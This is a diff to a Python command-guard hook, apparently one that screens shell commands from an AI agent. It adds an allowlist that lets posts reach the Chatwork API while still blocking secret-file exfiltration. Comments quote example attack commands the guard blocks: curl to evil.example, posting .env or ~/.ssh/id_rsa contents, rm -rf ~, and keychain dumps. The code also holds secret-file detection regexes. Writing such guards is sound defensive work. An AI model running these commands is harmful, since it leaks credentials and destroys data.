@@ -28,6 +28,15 @@ SECRETS = (r'(\.env\b|\.ssh/|id_rsa|id_ed25519|id_ecdsa|\.pem\b|\.p12\b|\.netrc'
            r'|credentials\b|secret|token|password|passwd|api[_-]?key|access[_-]?key'
            r'|private[_-]?key|AWS_SECRET|AWS_ACCESS_KEY|keychain)')
 
+# SECRET_FILES = 「秘密の“ファイル”を参照している」ことを示す指標（SECRETS の部分集合）。
+# token/password/secret/api_key 等の“語”は除外している点が重要:
+#   - `-H "X-ChatWorkToken: $CHATWORK_API_TOKEN"` のような認証ヘッダは SECRET_FILES に当たらない
+#     （正規のAPI認証であり、サンクション済み送信先になら通してよい）。
+#   - 一方 `.ssh/id_rsa` `.env` `credentials` 等の“ファイル”は、宛先がサンクション済みでも
+#     送出させない（秘密ファイルの中身を外へ出す経路を塞ぐ）。
+SECRET_FILES = (r'(\.env\b|\.ssh/|id_rsa|id_ed25519|id_ecdsa|\.pem\b|\.p12\b|\.netrc'
+                r'|credentials\b|private[_-]?key|AWS_SECRET|AWS_ACCESS_KEY|keychain)')
+
 CATASTROPHIC = [
     (r'\bmkfs(\.\w+)?\b', 'ファイルシステム作成(mkfs)'),
     (r'\bdd\b[^\n;|&]*\bof=/dev/', 'ディスクへの dd 書き込み'),
@@ -139,6 +148,70 @@ def check_rm(cmd, root):
                 deny("作業ディレクトリ外/危険な再帰削除: rm ... %s" % t)
 
 
+# ============================================================================
+# サンクション済み送信先 allowlist（意図した外部送信だけ通す / 汎用機構）
+# ============================================================================
+# 目的: Chatwork 投稿のような「意図した外部送信」を1つだけ通したい。だが
+# 「外部送信を全部許可」は絶対にしない。許可は次の "2条件 AND" を満たす時だけ:
+#
+#   条件1: コマンド中の **全ての URL** が NR_ALLOWED_SEND_URLS のいずれかの
+#          正規表現に一致する（1つでも別宛先が混じれば不許可）。
+#   条件2: コマンドが **秘密ファイル**（SECRET_FILES: .ssh/ id_rsa .env
+#          credentials .pem 等）を参照していない（認証トークンの“ヘッダ”はOK、
+#          秘密ファイルの“中身”の送出はNG）。
+#
+# そして allowlist が緩めるのは「秘密の外部送信(SENDERS+SECRETS)」ルール **だけ**。
+# 破壊的削除・push/deploy・Keychain 取り出し・WebFetch 等は従来どおり止まる。
+#
+# 例: NR_ALLOWED_SEND_URLS = ^https://api\.chatwork\.com/v2/rooms/[^/?#]+/messages$
+#
+#   通す (ALLOW):
+#     curl -X POST -H "X-ChatWorkToken: $CHATWORK_API_TOKEN" \
+#          -d "body=..." https://api.chatwork.com/v2/rooms/123/messages
+#       → 全URLが一致(条件1) かつ 秘密ファイル参照なし(条件2)。トークンは認証ヘッダ。
+#
+#   弾く (DENY、いずれも従来の秘密送信ルールに戻る/別ルールで停止):
+#     ・別宛先:   curl ... https://evil.example/collect              （条件1で不一致）
+#     ・2宛先混在: curl ...chatwork.../messages; curl ...evil...      （条件1で不一致）
+#     ・秘密送出: curl -d @.env ...chatwork.../messages              （条件2で .env 参照）
+#                curl -d "x=$(cat ~/.ssh/id_rsa)" ...chatwork.../messages（条件2で id_rsa）
+#     ・別ルール: git push / rm -rf ~ / security find-generic-password（allowlistは無関係に停止）
+#
+# 正規表現の堅さ: URL は fullmatch（全体一致）で判定するため、
+#   `.../messages/../../evil` のような「許可プレフィックス＋別パス」は弾かれる。
+#   [^/?#]+ で room セグメントを1階層に縛り、host も api\.chatwork\.com で固定。
+def _allowed_send_patterns():
+    raw = os.environ.get("NR_ALLOWED_SEND_URLS", "") or ""
+    pats = []
+    for tok in re.split(r'[\s,]+', raw.strip()):
+        if not tok:
+            continue
+        try:
+            pats.append(re.compile(tok))
+        except re.error:
+            # 不正な正規表現は無視（=その分は許可しない＝安全側）
+            pass
+    return pats
+
+
+def is_sanctioned_send(cmd):
+    pats = _allowed_send_patterns()
+    if not pats:
+        return False
+    urls = re.findall(r'https?://[^\s"\'<>|;&)]+', cmd)
+    if not urls:
+        return False
+    # 条件1: 全URLが一致。fullmatch（URL 全体一致）にすることで、
+    # `.../messages/../../me` のような「許可プレフィックス＋別パス」での前方一致回避を塞ぐ。
+    # ユーザの正規表現が末尾 $ を付け忘れても、fullmatch がURL末尾まで一致を強制する。
+    for u in urls:
+        if not any(p.fullmatch(u) for p in pats):
+            return False
+    if re.search(SECRET_FILES, cmd, re.I):           # 条件2: 秘密ファイル不参照
+        return False
+    return True
+
+
 def check_bash(cmd, root):
     for pat, label in CATASTROPHIC:
         if re.search(pat, cmd, re.I):
@@ -147,8 +220,10 @@ def check_bash(cmd, root):
     for pat, label in PUSH_DEPLOY:
         if re.search(pat, cmd, re.I):
             deny("本番/デプロイ/不可逆送信: " + label)
+    # 秘密の外部送信。ただしサンクション済み送信先(2条件)なら通す。
     if re.search(SENDERS, cmd, re.I) and re.search(SECRETS, cmd, re.I):
-        deny("秘密情報の外部送信の疑い（ネットワーク送信＋秘密参照）")
+        if not is_sanctioned_send(cmd):
+            deny("秘密情報の外部送信の疑い（ネットワーク送信＋秘密参照）")
     if re.search(r'\bsecurity\s+(find-generic-password|find-internet-password|dump-keychain)', cmd, re.I):
         deny("Keychain からの秘密取り出し")
 
